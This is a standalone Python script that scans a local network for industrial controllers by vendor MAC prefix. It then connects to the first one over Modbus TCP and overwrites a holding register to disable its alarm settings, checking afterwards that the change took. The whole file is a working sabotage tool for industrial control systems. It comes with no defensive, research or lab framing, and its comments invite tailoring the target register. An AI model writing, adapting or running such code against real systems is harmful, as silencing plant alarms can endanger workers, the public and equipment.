import scapy.all as scapy
from pymodbus.client.sync import ModbusTcpClient
import time

# Function to find the PLC's IP address by scanning the local network
def find_plc_ip():
    print("[*] Scanning network to find PLC IP...")
    arp_request = scapy.ARP(pdst="192.168.1.1/24")  # Adjust network range as needed
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]

    possible_plcs = []
    for answer in answered:
        ip = answer[1].psrc
        mac = answer[1].hwsrc
        print(f"[*] Found device: {ip} - {mac}")
        
        # If known MAC prefix matches a known PLC vendor (Siemens, Rockwell, etc.), add to list
        if mac.startswith(("00:0E:CF", "00:80:41")):  # Example MAC prefixes
            possible_plcs.append(ip)

    if possible_plcs:
        print(f"[+] Possible PLC found: {possible_plcs[0]}")
        return possible_plcs[0]
    else:
        print("[-] No PLC found!")
        return None

# Function to modify alarm settings in the PLC
def modify_alarm_settings(plc_ip):
    print(f"[*] Connecting to PLC at {plc_ip}...")
    
    # Connect to the PLC via Modbus TCP
    client = ModbusTcpClient(plc_ip, port=502)
    if client.connect():
        print("[+] Connected successfully!")
        
        # Target register (example: alarm settings often stored in holding registers)
        alarm_register = 40001  # Example register number, change as needed
        
        # Read current alarm settings
        response = client.read_holding_registers(alarm_register, count=1)
        if response and response.registers:
            original_value = response.registers[0]
            print(f"[*] Current alarm setting: {original_value}")
            
            # Modify the alarm settings (example: disable alarms)
            new_value = 0  # Modify according to your needs (e.g., disable alarms)
            client.write_register(alarm_register, new_value)
            print(f"[+] Alarm setting modified successfully! ({original_value} -> {new_value})")

            # Verify modification
            verify_response = client.read_holding_registers(alarm_register, count=1)
            if verify_response and verify_response.registers[0] == new_value:
                print("[+] Modification verified successfully!")
            else:
                print("[-] Modification failed!")

        else:
            print("[-] Failed to read alarm settings!")

        client.close()
    else:
        print("[-] Failed to connect to PLC!")

# Main execution function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        modify_alarm_settings(plc_ip)

if __name__ == "__main__":
    main()